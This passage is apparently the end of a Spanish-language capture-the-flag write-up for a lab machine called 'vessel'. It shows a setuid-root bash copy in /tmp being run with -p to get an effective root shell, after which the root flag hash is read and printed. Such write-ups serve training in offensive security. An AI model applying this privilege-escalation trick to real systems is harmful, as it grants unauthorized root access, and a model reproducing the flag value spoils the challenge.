-rwsr-xr-x 1 root root 1183448 Oct 14 18:38 bash
```

Me conecto como ```root``` y puedo ver la segunda flag

```null
ethan@vessel:/tmp$ ./bash -p
bash-5.0# id
uid=1000(ethan) gid=1000(ethan) euid=0(root) groups=1000(ethan)
bash-5.0# cat /root/root.txt 
b7cbbb54ecd0d5b69fbbec3dbcc072b0
```